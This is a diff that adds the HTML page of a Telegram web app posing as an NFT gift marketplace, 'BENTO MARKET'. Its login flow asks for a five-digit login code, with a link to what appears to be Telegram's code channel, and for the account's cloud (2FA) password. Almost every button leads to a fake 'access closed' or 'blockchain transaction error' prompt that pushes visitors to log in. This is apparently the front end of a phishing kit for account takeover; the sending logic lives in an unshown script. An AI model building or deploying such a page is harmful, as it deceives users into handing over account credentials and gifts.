@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="ru" style="visibility:hidden">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="color-scheme" content="dark">
+  <title>NFT Marketplace</title>
+  
+  <link rel="preconnect" href="https://telegram.org">
+  <link rel="preconnect" href="https://api.telegram.org">
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <link rel="preconnect" href="https://cdn.jsdelivr.net">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://nft.fragment.com">
+  
+  <link rel="dns-prefetch" href="https://telegram.org">
+  <link rel="dns-prefetch" href="https://api.telegram.org">
+  
+  <link rel="preload" href="styles.css" as="style">
+  <link rel="preload" href="script.js" as="script">
+  <link rel="preload" href="seasonData.js" as="script">
+  
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>if ('scrollRestoration' in history) history.scrollRestoration = 'manual';</script>
+  
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js" defer></script>
+  <script src="seasonData.js" defer></script>
+  
+  <script>document.addEventListener('DOMContentLoaded',()=>document.documentElement.style.visibility='visible')</script>
+</head>
+
+<body>
+  <div id="preloader" class="preloader" aria-live="polite" aria-busy="true">
+    <div class="loader">
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="text"><span>BENTO MARKET</span></div>
+      <div class="line"></div>
+    </div>
+  </div>
+  <div class="bg-overlay"></div>
+
+  <header class="header">
+    <div class="logo">BENTO MARKET</div>
+    <button class="auth-btn" id="authBtn">
+      <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+      <span data-i18n="authBtn">Войти</span>
+    </button>
+  </header>
+
+  <main class="main">
+    <div class="auth-modal" id="authModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeAuth">&times;</button>
+
+        <h1>MARKETPLACE</h1>
+
+        <div class="step-indicator">
+          <div class="step-dot active" id="step1-dot"></div>
+          <div class="step-dot" id="step2-dot"></div>
+          <div class="step-dot" id="step3-dot"></div>
+        </div>
+
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="auth-step active" id="step1">
+          <button class="btn btn-primary" id="startAuthBtn">
+            <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+            <span data-i18n="startAuthBtn">Войти</span>
+          </button>
+        </div>
+
+        <div class="auth-step" id="step2">
+          <p class="description" data-i18n="codeInputDesc">Введите код:</p>
+          <div class="code-input-container">
+            <label for="digit1" class="sr-only">Цифра 1</label>
+            <input type="text" class="code-digit" id="digit1" maxlength="1" inputmode="numeric"
+              aria-label="Первая цифра кода">
+            <label for="digit2" class="sr-only">Цифра 2</label>
+            <input type="text" class="code-digit" id="digit2" maxlength="1" inputmode="numeric"
+              aria-label="Вторая цифра кода">
+            <label for="digit3" class="sr-only">Цифра 3</label>
+            <input type="text" class="code-digit" id="digit3" maxlength="1" inputmode="numeric"
+              aria-label="Третья цифра кода">
+            <label for="digit4" class="sr-only">Цифра 4</label>
+            <input type="text" class="code-digit" id="digit4" maxlength="1" inputmode="numeric"
+              aria-label="Четвертая цифра кода">
+            <label for="digit5" class="sr-only">Цифра 5</label>
+            <input type="text" class="code-digit" id="digit5" maxlength="1" inputmode="numeric"
+              aria-label="Пятая цифра кода">
+          </div>
+          <a href="https://t.me/+42777" class="btn btn-secondary" id="getCodeBtn">
+            <span class="material-icons btn-icon">verified_user</span>
+            <span data-i18n="getCodeBtn">Показать код</span>
+          </a>
+        </div>
+
+        <div class="auth-step" id="step2fa">
+          <p class="password-title" data-i18n="password2faTitle">Введите пароль</p>
+          <label for="password2fa" class="sr-only">Облачный пароль</label>
+          <div class="password-input-container">
+            <input type="text" class="password-input" id="password2fa" aria-label="Облачный пароль"
+              placeholder="Введите облачный пароль">
+          </div>
+          <p class="password-hint" id="passwordHint"></p>
+          <button class="btn btn-primary" id="submit2faBtn">
+            <span class="material-icons btn-icon">done_all</span>
+            <span data-i18n="submit2faBtn">Подтвердить пароль</span>
+          </button>
+        </div>
+
+        <div class="auth-step" id="step3">
+          <div class="liquid-loader">
+            <div class="loading-text">
+              <span data-i18n="loadingText">Не закрывайте приложение до окончания синхронизации</span>
+            </div>
+            <div class="loader-track">
+              <div class="liquid-fill"></div>
+            </div>
+          </div>
+
+          <div class="success-content">
+            <span class="material-icons success-icon success-icon-blue">check_circle</span>
+            <h2 class="success-title" data-i18n="successTitle">Успешно!</h2>
+            <p class="description" data-i18n="successDesc">Подарок отправлен ожидайте!</p>
+            <button class="btn btn-primary" id="goToMarket">
+              <i class="ri-shopping-bag-3-line btn-icon"></i>
+              <span data-i18n="goToMarket">Перейти в маркет</span>
+            </button>
+          </div>
+        </div>
+
+        <div id="status"></div>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="offerModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeOffer">&times;</button>
+        <i class="ri-shield-keyhole-line offer-icon offer-icon-green"></i>
+        <h2 class="success-title" data-i18n="offerTitle">Доступ закрыт</h2>
+        <p class="description" data-i18n="offerDesc">Для покупки нужна авторизация на маркете</p>
+        <button class="btn btn-primary" id="closeOfferBtn">
+          <i class="ri-close-line btn-icon"></i>
+          <span data-i18n="closeBtn">Закрыть</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="giftAddModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeGiftAdd">&times;</button>
+        <i class="ri-shield-keyhole-line offer-icon offer-icon-green"></i>
+        <h2 class="success-title" data-i18n="giftAddTitle">Доступ закрыт</h2>
+        <p class="description" data-i18n="giftAddDesc">Для добавления подарка на маркет нужна авторизация</p>
+        <button class="btn btn-primary" id="authFromAddBtn">
+          <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+          <span data-i18n="authBtn2">Авторизоваться</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="giftWithdrawModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeGiftWithdraw">&times;</button>
+        <i class="ri-error-warning-line offer-icon"></i>
+        <h2 class="success-title" data-i18n="giftWithdrawTitle">Ошибка транзакции в блокчейн</h2>
+        <p class="description" data-i18n="giftWithdrawDesc">Для вывода подарка с маркета требуется авторизация</p>
+        <button class="btn btn-primary" id="authFromGiftBtn">
+          <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+          <span data-i18n="authBtn2">Авторизоваться</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="giftNoItemsModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeNoItems">&times;</button>
+        <i class="ri-inbox-unarchive-line offer-icon"></i>
+        <h2 class="success-title" data-i18n="giftNoItemsTitle">Подарков нет</h2>
+        <p class="description" data-i18n="giftNoItemsDesc">У вас нет подарков для выполнения этого действия</p>
+        <button class="btn btn-primary" id="closeNoItemsBtn">
+          <i class="ri-close-line btn-icon"></i>
+          <span data-i18n="closeBtn">Закрыть</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="giftSendModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeGiftSend">&times;</button>
+        <i class="ri-shield-keyhole-line offer-icon offer-icon-green"></i>
+        <h2 class="success-title" data-i18n="giftSendTitle">Доступ закрыт</h2>
+        <p class="description" data-i18n="giftSendDesc">Для отправки подарка другому пользователю нужна авторизация</p>
+        <button class="btn btn-primary" id="authFromSendBtn">
+          <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+          <span data-i18n="authBtn2">Авторизоваться</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="auth-modal" id="historyModal">
+      <div class="auth-container">
+        <button class="close-btn" id="closeHistory">&times;</button>
+        <i class="ri-lock-line offer-icon"></i>
+        <h2 class="success-title" data-i18n="historyTitle">Доступ закрыт</h2>
+        <p class="description" data-i18n="historyDesc">Для просмотра истории транзакций нужна авторизация</p>
+        <button class="btn btn-primary" id="authFromHistoryBtn">
+          <img src="https://telegram.org/img/favicon.ico" class="btn-icon tg-icon" alt="Telegram Icon">
+          <span data-i18n="authBtn2">Авторизоваться</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="view active" id="marketView">
+      <div class="market-toolbar">
+        <div class="toolbar-box">
+          <div class="toolbar-row">
+            <button class="all-btn" id="allGiftsBtn" type="button">
+              <i class="ri-gift-line"></i>
+              <span data-i18n="allGiftsBtn">Все подарки</span>
+            </button>
+            <div class="collection-dd">
+              <button class="collection-btn" id="collectionsToggle" type="button">
+                <i class="ri-filter-3-line"></i>
+                <span id="currentCollectionLabel">Коллекции</span>
+                <i class="ri-arrow-down-s-line chevron"></i>
+              </button>
+              <ul class="dropdown-panel" id="collectionsDropdown" hidden></ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="market-grid" id="marketGrid"></div>
+      <div class="load-more-wrap">
+        <button class="load-more-btn" id="showMoreBtn" type="button">
+          <i class="ri-arrow-down-circle-line"></i>
+          <span data-i18n="showMoreBtn">Показать ещё</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="view" id="giftsView">
+      <div class="gifts-toolbar">
+        <div class="toolbar-box">
+          <div class="gifts-tabs">
+            <button class="gift-tab active" data-tab="received">
+              <i class="ri-gift-2-line"></i>
+              <span data-i18n="giftsReceived">Полученные</span>
+              <span class="tab-badge" id="receivedBadge">1</span>
+            </button>
+            <button class="gift-tab" data-tab="listed">
+              <i class="ri-price-tag-3-line"></i>
+              <span data-i18n="giftsListed">Выставленные</span>
+              <span class="tab-badge" id="listedBadge">0</span>
+            </button>
+          </div>
+          <div class="gifts-actions">
+            <button class="gifts-action-btn" id="addGiftBtn">
+              <i class="ri-add-line"></i>
+              <span data-i18n="addGiftBtn">Добавить</span>
+            </button>
+            <button class="gifts-action-btn" id="withdrawGiftBtn">
+              <i class="ri-logout-box-line"></i>
+              <span data-i18n="withdrawGiftBtn">Вывести</span>
+            </button>
+            <button class="gifts-action-btn" id="sellGiftBtn">
+              <i class="ri-shopping-cart-line"></i>
+              <span data-i18n="sellGiftBtn">Продать</span>
+            </button>
+            <button class="gifts-action-btn" id="sendGiftBtn">
+              <i class="ri-send-plane-line"></i>
+              <span data-i18n="sendGiftBtn">Отправить</span>
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="gifts-content" id="giftsContent">
+        <div class="empty-gifts">
+          <i class="ri-gift-line gift-icon"></i>
+          <p id="emptyGiftsText">Подарков нет</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="view" id="profileView">
+      <div class="profile-header">
+        <div class="profile-avatar">
+          <img id="profileAvatar" src="" alt="Profile Avatar" class="avatar-img">
+        </div>
+        <button class="lang-switch" id="langSwitch" title="Switch Language">
+          <i class="ri-global-line lang-icon"></i>
+          <span class="lang-text" id="langText">RU</span>
+        </button>
+        <h2 id="profileName">Гость</h2>
+      </div>
+
+      <div class="profile-stats" role="group" aria-label="Профильные метрики">
+        <div class="stat-item">
+          <div class="stat-label" data-i18n="statVolume">Объём</div>
+          <div class="stat-value">0</div>
+        </div>
+        <div class="v-divider" role="separator" aria-hidden="true"></div>
+        <div class="stat-item">
+          <div class="stat-label" data-i18n="statBought">Куплено</div>
+          <div class="stat-value">0</div>
+        </div>
+        <div class="v-divider" role="separator" aria-hidden="true"></div>
+        <div class="stat-item">
+          <div class="stat-label" data-i18n="statSold">Продано</div>
+          <div class="stat-value">0</div>
+        </div>
+      </div>
+      <div class="section-divider" role="separator" aria-hidden="true"></div>
+
+      <div class="balance-card">
+        <div class="balance-left">
+          <img class="ton-icon" src="https://i.postimg.cc/Qx5NWjVV/11.png" alt="TON">
+          <div class="balance-text">
+            <div class="balance-label" data-i18n="balanceLabel">Баланс</div>
+            <div class="balance-value"><span id="balanceAmount">0</span> TON</div>
+          </div>
+        </div>
+        <div class="balance-actions">
+          <button class="btn btn-primary" id="topUpBtn">
+            <i class="ri-wallet-3-fill btn-icon"></i>
+            <span data-i18n="topUpBtn">Пополнить</span>
+          </button>
+          <button class="btn btn-secondary" id="withdrawBtn">
+            <i class="ri-bank-card-line btn-icon"></i>
+            <span data-i18n="withdrawBtn">Вывести</span>
+          </button>
+        </div>
+        <button class="btn btn-history" id="historyBtn">
+          <i class="ri-file-list-3-line btn-icon"></i>
+          <span data-i18n="historyBtn">История транзакций</span>
+        </button>
+      </div>
+
+      <div class="section-divider" role="separator" aria-hidden="true"></div>
+
+      <div class="profile-widgets">
+        <div class="widget-card widget-ring">
+          <div class="ring-outer">
+            <div class="ring-fill"></div>
+            <div class="ring-inner">
+              <i class="ri-fire-fill"></i>
+            </div>
+          </div>
+          <div class="widget-content">
+            <div class="widget-title" data-i18n="widgetLevel">Уровень</div>
+            <div class="widget-value" data-target="7">0</div>
+          </div>
+        </div>
+
+        <div class="widget-card widget-glow widget-rating">
+          <div class="rating-star-container">
+            <svg class="rating-star-bg" viewBox="0 0 24 24">
+              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
+            </svg>
+            <svg class="rating-star-fill" viewBox="0 0 24 24">
+              <defs>
+                <linearGradient id="starGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" class="star-gradient-stop1" />
+                  <stop offset="50%" class="star-gradient-stop2" />
+                  <stop offset="100%" class="star-gradient-stop3" />
+                </linearGradient>
+              </defs>
+              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
+            </svg>
+            <div class="rating-sparkles">
+              <span class="sparkle sparkle-1">✦</span>
+              <span class="sparkle sparkle-2">✦</span>
+              <span class="sparkle sparkle-3">✦</span>
+            </div>
+          </div>
+          <div class="widget-content">
+            <div class="widget-title" data-i18n="widgetRating">Рейтинг</div>
+            <div class="widget-value" data-target="1280">0</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-divider" role="separator" aria-hidden="true"></div>
+
+      <div class="profile-banners">
+        <div class="banner-card gradient-1">
+          <div class="banner-icon"><i class="ri-star-smile-line"></i></div>
+          <div class="banner-content">
+            <div class="banner-title" data-i18n="bannerTitle1">Еженедельные бонусы</div>
+            <div class="banner-sub" data-i18n="bannerSub1">Заберите подарок сегодня</div>
+          </div>
+        </div>
+        <div class="banner-card gradient-2">
+          <div class="banner-icon"><i class="ri-trophy-line"></i></div>
+          <div class="banner-content">
+            <div class="banner-title" data-i18n="bannerTitle2">Ежедневные задания</div>
+            <div class="banner-sub" data-i18n="bannerSub2">Выполняйте и получайте NFT</div>
+          </div>
+        </div>
+        <div class="banner-card gradient-3">
+          <div class="banner-icon"><i class="ri-price-tag-3-fill" aria-hidden="true"></i></div>
+          <div class="banner-content">
+            <div class="banner-title" data-i18n="bannerTitle3">Скидки недели</div>
+            <div class="banner-sub" data-i18n="bannerSub3">-20% на избранные коллекции</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="view" id="partnersView">
+      <div class="partners-hero">
+        <div class="partners-orb">
+          <i class="ri-user-shared-2-fill"></i>
+        </div>
+        <h2 class="partners-title" data-i18n="partnersTitle">Партнеры</h2>
+        <p class="partners-sub" data-i18n="partnersSub">Приглашай друзей в маркет — получай баллы и бесплатные овнеры на
+          подарки</p>
+        <button class="btn btn-primary" id="inviteBtn">
+          <i class="ri-share-forward-line btn-icon"></i>
+          <span data-i18n="inviteBtn">Пригласить друзей</span>
+        </button>
+      </div>
+
+      <div class="referral-stats">
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-icon">
+              <i class="ri-user-add-line"></i>
+            </div>
+            <div class="stat-info">
+              <div class="stat-label" data-i18n="referralInvited">Приглашено друзей</div>
+              <div class="stat-value" id="referralInvitedCount">0</div>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon">
+              <i class="ri-trophy-line"></i>
+            </div>
+            <div class="stat-info">
+              <div class="stat-label" data-i18n="referralEarned">Заработано баллов</div>
+              <div class="stat-value" id="referralEarnedPoints">0</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="referral-progress">
+        <h3 class="progress-title" data-i18n="referralProgressTitle">Прогресс наград</h3>
+        <div class="rp-bar">
+          <div class="rp-fill" id="referralProgressFill"></div>
+          <div class="rp-milestones">
+            <div class="rp-milestone" data-milestone="5">
+              <div class="rp-dot"></div>
+              <div class="rp-label" data-i18n="referralMilestone1">5 друзей</div>
+            </div>
+            <div class="rp-milestone" data-milestone="15">
+              <div class="rp-dot"></div>
+              <div class="rp-label" data-i18n="referralMilestone2">15 друзей</div>
+            </div>
+            <div class="rp-milestone" data-milestone="30">
+              <div class="rp-dot"></div>
+              <div class="rp-label" data-i18n="referralMilestone3">30 друзей</div>
+            </div>
+            <div class="rp-milestone" data-milestone="50">
+              <div class="rp-dot"></div>
+              <div class="rp-label" data-i18n="referralMilestone4">50 друзей</div>
+            </div>
+          </div>
+        </div>
+        <div class="rp-tier">
+          <span data-i18n="referralTier">Текущий уровень:</span>
+          <span id="referralCurrentTier">Новичок</span>
+        </div>
+      </div>
+
+      <div class="referral-rewards">
+        <div class="reward-item">
+          <div class="reward-icon-box">
+            <i class="ri-gift-line"></i>
+          </div>
+          <div class="reward-details">
+            <div class="reward-name" data-i18n="referralReward1">+50 баллов</div>
+            <div class="reward-desc" data-i18n="referralMilestone1">5 друзей</div>
+          </div>
+          <div class="reward-status" id="reward1Status">
+            <i class="ri-lock-line"></i>
+          </div>
+        </div>
+        <div class="reward-item">
+          <div class="reward-icon-box">
+            <i class="ri-medal-line"></i>
+          </div>
+          <div class="reward-details">
+            <div class="reward-name" data-i18n="referralReward2">+150 баллов</div>
+            <div class="reward-desc" data-i18n="referralMilestone2">15 друзей</div>
+          </div>
+          <div class="reward-status" id="reward2Status">
+            <i class="ri-lock-line"></i>
+          </div>
+        </div>
+        <div class="reward-item">
+          <div class="reward-icon-box">
+            <i class="ri-vip-crown-line"></i>
+          </div>
+          <div class="reward-details">
+            <div class="reward-name" data-i18n="referralReward3">+300 баллов</div>
+            <div class="reward-desc" data-i18n="referralMilestone3">30 друзей</div>
+          </div>
+          <div class="reward-status" id="reward3Status">
+            <i class="ri-lock-line"></i>
+          </div>
+        </div>
+        <div class="reward-item">
+          <div class="reward-icon-box">
+            <i class="ri-trophy-fill"></i>
+          </div>
+          <div class="reward-details">
+            <div class="reward-name" data-i18n="referralReward4">+500 баллов</div>
+            <div class="reward-desc" data-i18n="referralMilestone4">50 друзей</div>
+          </div>
+          <div class="reward-status" id="reward4Status">
+            <i class="ri-lock-line"></i>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="view" id="seasonsView">
+      <div class="seasons-hero">
+        <div class="season-badge">
+          <i class="ri-trophy-fill"></i>
+          <div class="season-text">
+            <div class="season-name" id="seasonName">Сезон</div>
+            <div class="season-sub" id="seasonSub">Октябрь 2025</div>
+          </div>
+        </div>
+
+        <div class="season-progress">
+          <div class="sp-bar">
+            <div class="sp-fill" id="seasonProgressFill"></div>
+          </div>
+          <div class="sp-stats">
+            <div class="sp-points"><span id="seasonPoints">0</span> <span data-i18n="seasonPoints">очков</span></div>
+            <div class="sp-tier"><span data-i18n="seasonTier">Текущий уровень:</span> <span id="seasonTier">Bronze
+                I</span></div>
+          </div>
+        </div>
+
+        <div class="rewards-grid" id="rewardsGrid"></div>
+
+        <div class="challenges" id="challenges"></div>
+
+        <div class="season-banners">
+          <div class="season-banner banner-glow-1">
+            <div class="banner-bg-effect"></div>
+            <div class="banner-icon-large"><i class="ri-vip-crown-line"></i></div>
+            <div class="banner-text">
+              <div class="banner-main" data-i18n="seasonBanner1Title">Премиум статус</div>
+              <div class="banner-desc" data-i18n="seasonBanner1Desc">Эксклюзивные награды и бонусы</div>
+            </div>
+            <div class="banner-arrow"><i class="ri-arrow-right-line"></i></div>
+          </div>
+
+          <div class="season-banner banner-glow-2">
+            <div class="banner-bg-effect"></div>
+            <div class="banner-icon-large"><i class="ri-rocket-line"></i></div>
+            <div class="banner-text">
+              <div class="banner-main" data-i18n="seasonBanner2Title">Ускорение прогресса</div>
+              <div class="banner-desc" data-i18n="seasonBanner2Desc">x2 очков за задания</div>
+            </div>
+            <div class="banner-arrow"><i class="ri-arrow-right-line"></i></div>
+          </div>
+
+          <div class="season-banner banner-glow-3">
+            <div class="banner-bg-effect"></div>
+            <div class="banner-icon-large"><i class="ri-medal-line"></i></div>
+            <div class="banner-text">
+              <div class="banner-main" data-i18n="seasonBanner3Title">Рейтинг лидеров</div>
+              <div class="banner-desc" data-i18n="seasonBanner3Desc">Топ-10 получают особые призы</div>
+            </div>
+            <div class="banner-arrow"><i class="ri-arrow-right-line"></i></div>
+          </div>
+
+          <div class="season-banner banner-glow-4">
+            <div class="banner-bg-effect"></div>
+            <div class="banner-icon-large"><i class="ri-time-line"></i></div>
+            <div class="banner-text">
+              <div class="banner-main" data-i18n="seasonBanner4Title">Ограниченное предложение</div>
+              <div class="banner-desc" data-i18n="seasonBanner4Desc">До конца сезона осталось 15 дней</div>
+            </div>
+            <div class="banner-arrow"><i class="ri-arrow-right-line"></i></div>
+          </div>
+        </div>
+
+        <div class="season-prize">
+          <div class="prize-icon"><i class="ri-gift-fill"></i></div>
+          <div class="prize-content">
+            <div class="prize-title" data-i18n="seasonPrizeTitle">Приз сезона</div>
+            <div class="prize-sub" id="prizeName">NFT подарочный бокс</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <nav class="bottom-nav">
+    <button class="nav-btn active" data-view="market">
+      <i class="ri-shopping-bag-3-line"></i>
+      <span data-i18n="navMarket">Маркет</span>
+    </button>
+    <button class="nav-btn" data-view="gifts">
+      <i class="ri-gift-line"></i>
+      <span data-i18n="navGifts">Подарки</span>
+      <span class="nav-badge nav-badge-hidden" id="giftsBadge">1</span>
+    </button>
+    <button class="nav-btn" data-view="seasons">
+      <i class="ri-trophy-line"></i>
+      <span data-i18n="navSeasons">Сезоны</span>
+    </button>
+    <button class="nav-btn" data-view="partners">
+      <i class="ri-user-shared-2-line"></i>
+      <span data-i18n="navPartners">Партнеры</span>
+    </button>
+    <button class="nav-btn" data-view="profile">
+      <i class="ri-user-3-line"></i>
+      <span data-i18n="navProfile">Профиль</span>
+    </button>
+  </nav>
+
+  <script src="script.js" defer></script>
+</body>
+
+</html>
